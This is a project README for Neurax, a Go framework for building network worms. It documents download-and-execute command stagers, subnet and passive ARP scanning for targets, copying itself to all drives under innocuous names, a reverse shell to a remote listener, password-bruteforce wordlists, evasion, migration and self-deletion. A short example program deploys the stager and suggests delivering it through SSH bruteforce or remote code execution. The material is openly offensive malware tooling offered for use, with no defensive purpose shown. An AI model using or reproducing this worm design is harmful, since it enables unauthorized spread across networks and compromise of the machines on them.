<br></br>
<p align="center">
  <a>
    <img alt="Neurax" title="Neurax" src="neurax.png">
  </a>
</p>
<br></br>
<p align="center"> A framework that aids in creation of self-spreading software</p>

<br></br>
## New in v. 2.X
- Refactor: abandoned framework-like approach in favour of a ready-to-use binary
- Generic wget stager for all UNIX targets
- Single config file to tweak worm's behaviour on the fly
- Automatic self-removal via `unlinkat(2)`
- Example LinuxKI CVE exploit to supplement network spreading capabilities 
- JSON config file is downloaded and evaluated 
- Minimalistic re-write of host harvester 

## New in v. 2.5
- Optional background execution of the second-stage binary (`N.StagerBg`)
- Command stager saves and executes in context-local path 
- It also removes the downloaded binary right after successful execution
- Removed synchronized command execution mechanism for speed/stability reasons.
I will come up with a decent alternative prior to next release.
- `N.NoInfectCheck` to disable checking if host is already infected.
- Single-execution policy on target machine, enforced with an exclusive file mutex placed inside `NeuraxServer()`.
- Added a nested goroutine for serving the binary
- New `httrack` stager for Linux
- Commented-out common wordlist for detection evasion
- Command stager can wait before removing the binary (`N.StagerRemovalDelay`)

## New in v. 2.0
- New wordlist mutators + common passwords by country
- Improvised passive scanning
- `.FastScan` option that makes active scans a bit quicker
- Wordlists are created strictly in-memory
- `NeuraxScan()` accepts a callback function instead of channel as an argument.
- `NeuraxScan()` scans in infinite loop with possibility to set interval between each scan of whole subnet/pool of targets
- Reverse-DNS lookup for targets that are not in IP format
- Extraction of target candidates from ARP cache
- Possibility to scan only a selected list of targets + prioritizing specific targets (such as default gateways)
- Possibility to specify interface and timeout when using passive network scan.
- Improved command stager (can be optionally executed with elevated privilleges / multiple times)
- Few changes of options' names
- `NeuraxConfig.` became `N.` (cause it's shorter to type)
- Functions for random memory allocation + binary migration
- Possibility to chain multiple stagers (ex. `wget` + `curl`)
- Volume and complexity of created wordlist can be easily tuned (with options such as `.WordlistExpand`)
- Possibility to set time-to-live of created binary

## Usage
With help of Neurax, Golang binaries can spread on local network without using any external servers.

Diverse config options and command stagers allow rapid propagation across various wireless environments.



### Example code

```go
package main
import . "github.com/redcode-labs/Neurax"

func main(){

  //Specify serving port and stager to use
  N.Port = 5555
  N.Stager = "wget"

  //Start a server that exposes the current binary in the background
  go NeuraxServer()
 
  //Copy current binary to all logical drives
  NeuraxDisks()

  //Create a command stager that should be launched on target machine
  //It will download, decode and execute the binary
  cmd_stager := NeuraxStager()

  /* Now you have to somehow execute the command generated above.
     You can use SSH bruteforce, some RCE or whatever else you want ;> */

}
```

### List of config entries

<span style="color:#b45e02">Name</span> | <span style="color:#5f1e2d">Description</span> | <span style="color:#aa5502">Default value</span>
--- | --- | ---
N.Stager           | Name of the command stager to use | `random, platform-compatible`
N.StagerSudo       | If true, Linux cmd stagers are executed with elevated privilleges | `false`
N.StagerRetry      | Number of times to re-execute the command stager | `0`
N.StagerRemoveDelay      | Sleep instruction is applied before removing the downloaded binary | `true`
N.Port             | Port to serve on | `6741`
N.Platform         | Platform to target | `detected automatically`
N.Path             | The path under which binary is saved on the host | `.`
N.FileName        | Name under which downloaded binary should be served and then saved | `random`
N.Base64           | Encode the transferred binary in base64 | `false`
N.CommPort        | Port that is used by binaries to communicate with each other | `7777`
N.CommProto       | Protocol for communication between nodes | `"udp"`
N.ReverseListener | Contains `"<host>:<port>"` of remote reverse shell handler | `not specified`
N.ReverseProto    | Protocol to use for reverse connection | `"udp"`
N.ScanRequiredPort    | NeuraxScan() treats host as active only when it has a specific port opened| `none`
N.ScanPassive     | NeuraxScan() detects hosts using passive ARP traffic monitoring | `false`
N.ScanPassiveTimeout     | NeuraxScan() monitors ARP layer this amount of seconds | `50 seconds`
N.ScanPassiveIface     | Interface to use when scanning passively| `default`
N.ScanActiveTimeout     | NeuraxScan() sets this value as timeout for scanned port in each thread | `2 seconds`
N.ScanPassiveAll         | NeuraxScan() captures packets on all found devices | `false`
N.ScanPassiveNoArp | Passive scan doesn't set strict ARP capture filter | `false`
N.ScanFirst       | A slice containing IP addresses to scan first | `[]string{}`
N.ScanFirstOnly | NeuraxScan() scans only hosts specified within `.ScanFirst`| `false`
N.ScanArpCache   | NeuraxScan() scans first the hosts found in local ARP cache. Works only with active scan | `false`
N.ScanCidr             | NeuraxScan() scans this CIDR | `local IP + "\24"`
N.ScanActiveThreads          | Number of threads to use for NeuraxScan() | `10`
N.ScanFullRange       | NeuraxScan() scans all ports of target host to determine if it is active | `from 19 to 300`
N.ScanInterval    | Time interval to sleep before scanning whole subnet again | `"2m"` 
N.ScanHostInterval    | Time interval to sleep before scanning next host in active mode | `"none"` 
N.ScanGatewayFirst | Gateway is the first host scanned when active scan is used | `false`
N.Verbose          | If true, all error messages are printed to STDOUT | `false`
N.Remove           | When any errors occur, binary removes itself from the host | `false`
N.PreventReexec   | If true, when any command matches with those that were already received before, it is not executed | `true`
N.WordlistExpand  | NeuraxWordlist() performs non-standard transformations on input words | false
N.WordlistCommon  | Prepend 20 most common passwords to wordlist | `false`
N.WordlistCommonNum | Number of common passwords to use | `all`
N.WordlistCommonCountries| A map[string]int that contains country codes and number of passwords to use| map[string]int
N.WordlistMutators | Mutators to use when `.WordlistExpand` is specified | `{"single_upper", "cyryllic", "encapsule"}`
N.WordlistPermuteNum | Maximum length of permutation generated by NeuraxWordlistPermute()| `2`
N.WordlistPermuteSeparator | A separator character to use for permutations | `"-"`
N.WordlistShuffle | Shuffle generated wordlist before returning it | `false`
N.AllocNum         | This entry defines how many times `NeuraxAlloc()` allocates random memory| `5`
N.Blacklist        | Slice that contains IP addresses that are excluded from any type of scanning | `[]string{}`
N.FastHTTP         | HTTP request in IsHostInfected() is performed using fasthttp library | `false`
N.Debug            | Enable debug messages | `false`
N.NoInfectCheck            | Disable checking if host is already infected | `true`

### Finding new targets
Function `NeuraxScan(func(string))` enables detection of active hosts on local network.
It's only argument is a callback function that is called in background for every active host.
Host is treated as active when it has at least 1 open port, is not already infected + fullfils conditions specified within `N.`

`NeuraxScan()` runs as infinite loop - it scans whole subnet specified by `.Cidr` config entry and when every host is scanned, function sleeps for an interval given in `.ScanInterval`.

### Disks infection
  Neurax binary doesn't have to copy itself using wireless means.
  Function `NeuraxDisks()` copies current binary (under non-suspicious name) to all logical drives that were found.
  Copied binary is not executed, but simply resides in it's destination waiting to be run.
  `NeuraxDisks()` returns an `error` if list of disks cannot be obtained or copying to any destination was impossible.

Another function, `NeuraxZIP(num_files int) err` allows to create a randomly named .zip archive containing current binary.
It is saved in current directory, and contains up to `num_files` random files it.

`NeuraxZIPSelf()` simply zips the current binary, creating an archive holding the same name.

### Reverse connections
An interactive reverse shell can be established with `NeuraxReverse()`.
It will receive commands from hostname specified inside `.ReverseListener` in a form of `"<host>:<port>"`.
Protocol that is used is defined under `.ReverseProto`
If `NeuraxOpenComm()` was started before calling this function, each command will behave as described in above section.
If it was not, commands will be executed locally.

Note: this function should be also runned as goroutine to prevent blocking caused by infinite loop used for receiving.

### Cleaning up
Whenever `"purge"` command is received by a node, it resends this command to all other nodes, removes itself from host and quits.
This behaviour can be also commenced using `NeuraxPurge()` executed somewhere in the source.

### Wordlist creation
If spread vector of your choice is based on some kind of bruteforce, it is good to have a proper wordlist prepared. 
Storing words in a text-file on client side isn't really effective, so you can mutate a basic wordlist using `NeuraxWordlist(...words) []string`.
To permute a set of given words, use `NeuraxWordlistPermute(..words) []string`

### Setting time-to-live 
If you want your binary to remove itself after given time, use `NeuraxSetTTL()` at the beginnig of your code.
This function should be launched as a goroutine.
For example:

`go NeuraxSetTTL("2m")`

will make the binary run `NeuraxPurgeSelf()` after 2 minutes from initial execution.

### Using multiple stagers at once
If you would like to chain all stagers available for given platform, set `.Stager` to `"chain"`.

### Moving the dropped binary
If you need to copy the binary after initial execution, use `NeuraxMigrate(path string)`.
It will copy the binary under `path`, remove current binary and execute newly migrated one.


## Support this tool
If you like this project and want to see it grow, please consider making a small donation :>

[ >>>>> DONATE <<<<<](https://paypal.me/redcodelabs?locale.x=pl_PL)

## License
This software is under [MIT license](https://en.wikipedia.org/wiki/MIT_License)